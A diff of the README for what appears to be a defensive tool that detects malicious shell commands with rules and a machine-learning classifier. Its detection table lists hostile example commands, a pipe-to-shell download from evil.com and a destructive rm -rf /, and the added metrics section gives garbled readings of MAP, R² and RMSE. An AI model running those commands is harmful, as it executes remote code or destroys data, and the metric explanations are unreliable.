@@ -90,6 +90,20 @@ The biggest problem with AI in security is **speed**. If you wait 5 seconds for 
 | **Script Download** | `curl http://evil.com/script.sh \| bash` | Rule Engine: pipe-to-shell pattern |
 | **Destructive Command** | `rm -rf / --no-preserve-root` | Rule Engine: destructive pattern |
 | **Log4Shell-style** | App spawning unexpected shell | Kernel intercepts the execve spawn |
+| **Crypto-Miner / Memory Bomb** | Process spikes RAM at spawn (>50MB) | Rule Engine: `memory_hog` flag + +30 risk penalty |
+
+---
+
+## 📈 ML Model Performance
+
+The Tier B Logistic Regression model is trained on a sanitized 12,000-command dataset using a 5,000-feature TF-IDF pipeline with balanced class weights. The current test-set metrics are:
+
+| Metric | Score | Impact |
+|---|---|---|
+| **Accuracy** | `98.83%` | Extremely high classification correctness. |
+| **MAP** | `0.9925` | **Mean Average Precision**: The model practically never triggers a False Positive when it flags a command as Malicious. |
+| **R² Score** | `0.9060` | Captures >90% of the behavioral variance between safe and malicious commands. |
+| **RMSE** | `0.1208` | **Root Mean Square Error**: When the model predicts Malicious, its probability output is highly confident (e.g., 0.98), not guessing (e.g., 0.55). |
 
 ---
 
@@ -343,6 +357,9 @@ The project whitepaper provides a detailed breakdown of:
 - [x] Auto-remediation (kill malicious process)
 - [x] `/healthz` liveness probe
 - [x] Startup banner with system state
+- [x] Dynamic AI Sensitivity Thresholds
+- [x] Tag-based Webhook Filtering (Safe/Suspicious/Malicious)
+- [x] Real-time JSON Log Export
 - [ ] Rate limiting (Phase 3)
 - [ ] API key auth + tunnel protection (Phase 3)
 - [ ] LLM-powered explanation tier (Tier C)
